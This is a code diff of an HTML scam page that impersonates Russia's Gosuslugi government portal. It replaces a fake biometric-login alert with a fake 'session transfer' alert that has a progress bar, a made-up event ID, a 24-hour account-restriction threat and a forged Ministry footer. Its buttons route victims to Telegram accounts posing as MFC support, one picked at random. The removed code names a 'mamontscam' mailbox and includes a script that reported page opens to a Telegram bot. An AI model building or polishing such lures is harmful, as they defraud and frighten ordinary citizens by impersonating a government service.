@@ -21,56 +21,54 @@
             align-items: center;
             color: black;
             overflow: hidden;
-            line-height: 1.5;
+            line-height: 1.4;
             padding-top: 15px;
-            transition: background-color 0.3s;
-        }
-
-        body.darkened {
-            background-color: #666;
+            position: relative;
         }
         
         .logo {
-            font-size: 38px;
-            font-weight: 900;
-            margin-bottom: 50px;
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 30px;
             margin-top: 10px;
-            letter-spacing: 1px;
-            font-stretch: condensed;
+            letter-spacing: 0.5px;
+            z-index: 1002;
+            position: fixed;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
         }
         
         .gos {
             color: #0056b3;
-            text-transform: lowercase;
-            display: inline-block;
-            transform: scale(1, 0.9);
         }
         
         .uslugi {
             color: #d52b1e;
-            text-transform: lowercase;
-            display: inline-block;
-            transform: scale(1, 0.9);
         }
         
         .window {
             background: white;
             border-radius: 12px;
-            padding: 40px 30px;
+            padding: 30px 25px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.1);
             text-align: center;
-            width: 400px;
+            width: 500px;
+            max-width: 90%;
+            position: relative;
+            z-index: 1;
+            margin-top: 70px;
         }
         
         .title {
             font-size: 20px;
             font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
-        .text {
+        .loading-text {
             font-size: 16px;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #666;
         }
         
@@ -78,7 +76,7 @@
             display: flex;
             justify-content: center;
             gap: 8px;
-            margin-top: 30px;
+            margin-top: 25px;
         }
         
         .dot {
@@ -112,99 +110,409 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
+            z-index: 1001;
             justify-content: center;
-            align-items: center;
+            align-items: flex-start;
+            padding: 80px 15px 15px;
+            overflow: hidden;
         }
 
         .modal-content {
             background: white;
             border-radius: 12px;
-            padding: 30px;
-            width: 90%;
-            max-width: 500px;
+            padding: 20px;
+            width: 95%;
+            max-width: 800px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            max-height: calc(100vh - 100px);
+            overflow-y: auto;
+            margin: 0 auto;
         }
 
-        .modal-header {
-            text-align: center;
-            margin-bottom: 20px;
+        /* Новая секция: успешный перенос */
+        .success-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 5px;
         }
 
-        .modal-title {
-            font-size: 24px;
+        .success-icon {
+            width: 24px;
+            height: 24px;
+            background: #28a745;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
             font-weight: bold;
-            color: #0056b3;
-            margin-bottom: 10px;
+            font-size: 14px;
+            flex-shrink: 0;
         }
 
-        .modal-subtitle {
+        .success-text {
             font-size: 18px;
             font-weight: bold;
-            color: #d52b1e;
-            margin-bottom: 20px;
+            color: #000000;
         }
 
-        .modal-text {
+        /* Стили для блока безопасности */
+        .security-info {
             font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 15px;
-            text-align: left;
+            line-height: 1.5;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 5px;
         }
 
-        .highlight {
+        .info-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .info-icon {
+            width: 14px;
+            height: 14px;
+            background: #0056b3;
+            border-radius: 50%;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-text {
+            flex: 1;
+        }
+
+        .info-label {
             font-weight: bold;
-            color: #d52b1e;
         }
 
-        .ip-info {
-            background: #f0f0f0;
-            padding: 10px;
+        /* Голубой блок с информацией */
+        .info-block {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 12px;
+            background: #e6f7ff;
+            border-radius: 8px;
+            border-left: 4px solid #1890ff;
+            margin-bottom: 5px;
+        }
+
+        .info-block-icon {
+            width: 20px;
+            height: 20px;
+            background: #1890ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .info-block-text {
+            font-size: 14px;
+            color: #000000;
+        }
+
+        .progress-container {
+            margin: 15px 0;
+        }
+
+        .progress-text {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        /* Новые стили для предупреждения */
+        .warning-block {
+            padding: 12px;
+            background: #fffbf0;
+            border-radius: 8px;
+            border-left: 4px solid #ffc107;
+            margin-bottom: 5px;
+        }
+
+        .warning-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .warning-icon {
+            color: #ffc107;
+            font-size: 18px;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .warning-text {
+            color: #d52b1e;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .recommendations {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .recommendation-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 6px;
+            margin-bottom: 5px;
+        }
+
+        .recommendation-dot {
+            width: 5px;
+            height: 5px;
+            background: #0056b3;
+            border-radius: 50%;
+            margin-top: 7px;
+            flex-shrink: 0;
+        }
+
+        .time-warning {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .time-icon {
+            font-size: 16px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .buttons-container {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px 18px;
             border-radius: 6px;
-            margin: 15px 0;
+            text-decoration: none;
+            text-align: center;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
             font-size: 14px;
         }
 
-        .warning {
-            color: #d52b1e;
-            font-weight: bold;
-            font-size: 15px;
-            margin: 15px 0;
+        .btn-call {
+            background: white;
+            color: #0056b3;
+            border: 2px solid #0056b3;
         }
 
-        .support-link {
-            display: block;
+        .btn-support {
             background: #0056b3;
             color: white;
-            text-decoration: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            text-align: center;
-            margin: 20px 0;
-            font-weight: bold;
-            transition: background-color 0.3s;
+            border: 2px solid #0056b3;
         }
 
-        .support-link:hover {
-            background: #004494;
-        }
-
-        .support-text {
-            font-size: 12px;
+        .footer-text {
+            font-size: 10px;
             color: #666;
             text-align: center;
-            margin-top: 10px;
+            line-height: 1.3;
+            margin-top: 8px;
         }
 
-        .email-link {
-            color: #0056b3;
-            text-decoration: none;
-            font-weight: bold;
+        .footer-line {
+            margin: 3px 0;
         }
 
-        .email-link:hover {
-            text-decoration: underline;
+        /* Медиа-запросы для мобильных устройств */
+        @media (max-width: 768px) {
+            body {
+                padding-top: 10px;
+                justify-content: flex-start;
+            }
+            
+            .logo {
+                font-size: 26px;
+                margin-bottom: 20px;
+                margin-top: 5px;
+            }
+            
+            .window {
+                padding: 20px 15px;
+                width: 95%;
+                max-width: 400px;
+                margin-top: 60px;
+            }
+            
+            .title {
+                font-size: 18px;
+                margin-bottom: 12px;
+            }
+            
+            .loading-text {
+                font-size: 14px;
+            }
+            
+            .progress-text {
+                font-size: 20px;
+            }
+            
+            .modal {
+                padding: 70px 10px 10px;
+            }
+            
+            .modal-content {
+                padding: 15px 12px;
+                width: 100%;
+                gap: 12px;
+                max-height: calc(100vh - 90px);
+            }
+            
+            .success-text {
+                font-size: 16px;
+            }
+            
+            .buttons-container {
+                flex-direction: column;
+                gap: 8px;
+            }
+            
+            .btn {
+                padding: 12px 15px;
+                font-size: 14px;
+            }
+            
+            .security-info {
+                padding: 10px;
+                font-size: 13px;
+            }
+            
+            .info-block {
+                padding: 10px;
+                font-size: 13px;
+            }
+            
+            .warning-block {
+                padding: 10px;
+            }
+            
+            .warning-header {
+                flex-direction: column;
+                gap: 6px;
+            }
+            
+            .warning-text {
+                font-size: 13px;
+            }
+            
+            .recommendations {
+                font-size: 13px;
+            }
+            
+            .time-warning {
+                font-size: 13px;
+            }
+            
+            .footer-text {
+                font-size: 9px;
+            }
+            
+            .info-item {
+                flex-direction: column;
+                gap: 4px;
+            }
+            
+            .info-icon {
+                align-self: flex-start;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 22px;
+                margin-bottom: 15px;
+            }
+            
+            .window {
+                padding: 18px 12px;
+                margin-top: 50px;
+            }
+            
+            .title {
+                font-size: 16px;
+            }
+            
+            .loading-text {
+                font-size: 13px;
+            }
+            
+            .progress-text {
+                font-size: 18px;
+            }
+            
+            .dot {
+                width: 10px;
+                height: 10px;
+            }
+            
+            .modal {
+                padding: 60px 8px 8px;
+            }
+            
+            .modal-content {
+                padding: 12px 10px;
+                max-height: calc(100vh - 80px);
+            }
+            
+            .success-text {
+                font-size: 15px;
+            }
+            
+            .btn {
+                padding: 10px 12px;
+                font-size: 13px;
+            }
+            
+            .footer-text {
+                font-size: 8px;
+            }
+        }
+
+        @media (max-height: 600px) {
+            .modal {
+                padding-top: 60px;
+            }
+            
+            .logo {
+                margin-bottom: 15px;
+            }
+            
+            .modal-content {
+                max-height: calc(100vh - 70px);
+            }
         }
     </style>
 </head>
@@ -214,10 +522,13 @@
     </div>
     
     <div class="window">
-        <h1 class="title">Госуслуги сейчас откроются</h1>
+        <h1 class="title">выгрузка данных</h1>
         
-        <div class="text">Портал работает в прежнем режиме.</div>
-        <div class="text">Подождите пару секунд.</div>
+        <div class="progress-container">
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+        
+        <div class="loading-text">Выгрузка данных на другое устройство подтверждена при помощи ссылки для переноса сессии.</div>
         
         <div class="loading-dots">
             <div class="dot"></div>
@@ -226,74 +537,150 @@
         </div>
     </div>
 
-    <!-- Модальное окно -->
-    <div class="modal" id="alertModal">
+    <!-- Единое модальное окно -->
+    <div class="modal" id="mainModal">
         <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title">ГОСУСЛУГИ</div>
-                <div class="modal-subtitle">Внимание!</div>
-            </div>
-            
-            <div class="modal-text">
-                Вы успешно подтвердили вход с помощью биометрии лица с нового устройства: 
-                <strong>IOS, 17.5.1 (21F90), iPhone 12 Pro.</strong> 
-                Документы будут отправлены на почту: 
-                <strong>mamontscam1312@yandex.ru</strong>.
+            <!-- Секция успешного переноса -->
+            <div class="success-header">
+                <div class="success-icon">✓</div>
+                <div class="success-text">Перенос активной сессии прошел успешно, теперь Госуслуги доступны на новом устройстве</div>
             </div>
 
-            <div class="ip-info">
-                Место входа: Украина (IP = 91.193.131.34)
+            <!-- Секция: информация о безопасности -->
+            <div class="security-info">
+                <div style="margin-bottom: 10px;">
+                    Система безопасности зафиксировала передачу активной сессии Вашей учетной записи портала "Госуслуги" (gosuslugi.ru) на стороннее устройство.
+                </div>
+
+                <div class="info-item">
+                    <div class="info-icon"></div>
+                    <div class="info-text">
+                        <span class="info-label">Тип доступа:</span> Перенос сессии на другое устройство / Ссылка для переноса
+                    </div>
+                </div>
+
+                <div class="info-item">
+                    <div class="info-icon"></div>
+                    <div class="info-text">
+                        <span class="info-label">Источник доступа:</span> Нераспознанное устройство / IP-адрес вне вашей текущей геолокации
+                    </div>
+                </div>
+
+                <div class="info-item">
+                    <div class="info-icon"></div>
+                    <div class="info-text">
+                        <span class="info-label">ID события:</span> #GS-3 847 291
+                    </div>
+                </div>
+
+                <div class="info-item">
+                    <div class="info-icon"></div>
+                    <div class="info-text">
+                        <span class="info-label">Статус сессии:</span> Активна
+                    </div>
+                </div>
             </div>
 
-            <div class="warning">
-                Если данные действия выполняли не Вы, <span class="highlight">НЕМЕДЛЕННО ОБРАТИТЕСЬ</span> 
-                в чат бот поддержки портала ГосУслуг:
+            <!-- Голубой блок с информацией -->
+            <div class="info-block">
+                <div class="info-block-icon">i</div>
+                <div class="info-block-text">Если перенос выполнили Вы, просто проигнорируйте данное уведомление!</div>
             </div>
 
-            <a href="https://t.me/MFC_officialbot" class="support-link" target="_blank">Перейти в чат бот</a>
-            
-            <div class="support-text">
-                <a href="mailto:gosuslugi.informer@gmail.com" class="email-link">Служба поддержки Госуслуг</a>
+            <!-- Секция: предупреждение -->
+            <div class="warning-block">
+                <div class="warning-header">
+                    <div class="warning-icon">⚠</div>
+                    <div class="warning-text">Если Вы не осуществляли вход с нового устройства и не передавали доступ третьим лицам, возможна попытка несанкционированного доступа.</div>
+                </div>
+                
+                <div class="recommendations">
+                    Для защиты учётной записи и сохранности персональных данных настоятельно рекомендуем:
+                    
+                    <div class="recommendation-item">
+                        <div class="recommendation-dot"></div>
+                        <div>немедленно пройти подтверждение личности,</div>
+                    </div>
+                    
+                    <div class="recommendation-item">
+                        <div class="recommendation-dot"></div>
+                        <div>связаться со службой поддержки для проверки активности.</div>
+                    </div>
+                </div>
+                
+                <div class="time-warning">
+                    <div class="time-icon">⏳</div>
+                    <div>При отсутствии подтверждения в течение 24 часов доступ к учетной записи может быть ограничен на срок до 72 часов в целях безопасности.</div>
+                </div>
+            </div>
+
+            <!-- Кнопки после предупреждения -->
+            <div class="buttons-container">
+                <a href="#" class="btn btn-call" id="callBtn">позвонить</a>
+                <a href="https://t.me/MFC_officialbot" class="btn btn-support" target="_blank">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.18c-.209-.043-1.139 1.381-1.139 1.381s-2.224 2.18-3.462 3.382c-.402.355-.827.532-1.127.532-.468 0-.671-.389-.671-.389-.087-.208-.119-.446-.119-.746 0-1.381.839-2.561.839-2.561s3.997-3.532 4.309-3.806c.312-.274.069-.316-.069-.316h-1.144c-.312 0-.625.156-.625.156s-4.498 2.902-5.893 3.838c-.418.274-.835.417-1.127.417-.521 0-.729-.208-.729-.208s-.521-.417.365-.729c.886-.313 2.083-.729 2.083-.729s4.394-1.882 4.914-2.244c.521-.363.208-.521-.156-.521h-1.3z"/>
+                    </svg>
+                    Чат поддержки
+                </a>
+            </div>
+
+            <!-- Футер -->
+            <div class="footer-text">
+                <div class="footer-line">С уважением,</div>
+                <div class="footer-line">Служба поддержки пользователей</div>
+                <div class="footer-line">Федеральная государственная информационная система</div>
+                <div class="footer-line" style="margin-top: 6px;">Это уведомление отправлено автоматически. Пожалуйста, не отвечайте на него</div>
+                <div class="footer-line" style="margin-top: 6px;">© 2025 Минцифры России, г. Москва, ул. Тверская, д. 7. Все права защищены</div>
+                <div class="footer-line">ФГИС «Госуслуги» | Министерство цифрового развития, связи и массовых коммуникаций Российской Федерации</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Через 2 секунды показываем окно (без запроса камеры)
-        setTimeout(() => {
-            showAlertModal();
-        }, 2000);
-
-        function showAlertModal() {
-            // Затемняем фон
-            document.body.classList.add('darkened');
+        // Анимация прогресса загрузки (только проценты)
+        const progressText = document.getElementById('progressText');
+        let progress = 0;
+        
+        const progressInterval = setInterval(() => {
+            progress += 1;
+            progressText.textContent = progress + '%';
             
+            if (progress >= 100) {
+                clearInterval(progressInterval);
+                // После завершения загрузки показываем модальное окно
+                setTimeout(() => {
+                    showMainModal();
+                }, 500);
+            }
+        }, 30); // 100% за 3 секунды
+
+        function showMainModal() {
             // Показываем модальное окно
-            const modal = document.getElementById('alertModal');
+            const modal = document.getElementById('mainModal');
             modal.style.display = 'flex';
             
-            // Скрываем окно загрузки
+            // Скрываем только окно загрузки, логотип остается
             document.querySelector('.window').style.display = 'none';
         }
 
-        // Убрал обработчик закрытия окна при клике мимо
-        // Теперь окно не будет закрываться при клике на затемненную область
+        // Обработчик для кнопки "позвонить" - рандомный выбор ссылки
+        document.getElementById('callBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Массив с Telegram ссылками
+            const telegramLinks = [
+                'https://t.me/MFCRUSSIA_OFFICIAL',
+                'https://t.me/MFC_OFFICIALRU', 
+                'https://t.me/mfc_alexander'
+            ];
+            
+            // Случайный выбор ссылки
+            const randomLink = telegramLinks[Math.floor(Math.random() * telegramLinks.length)];
+            
+            // Открываем случайную ссылку
+            window.open(randomLink, '_blank');
+        });
     </script>
-
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const tg = window.Telegram?.WebApp;
-    if (!tg) return;          // открыт НЕ из Telegram — выходим
-    tg.expand();
-    tg.ready();               // сообщаем, что WebApp готов
-    try {
-      tg.sendData(JSON.stringify({ event: "opened" })); // сигнал боту
-    } catch (e) {}
-  });
-</script>
 </body>
-
 </html>
-
-
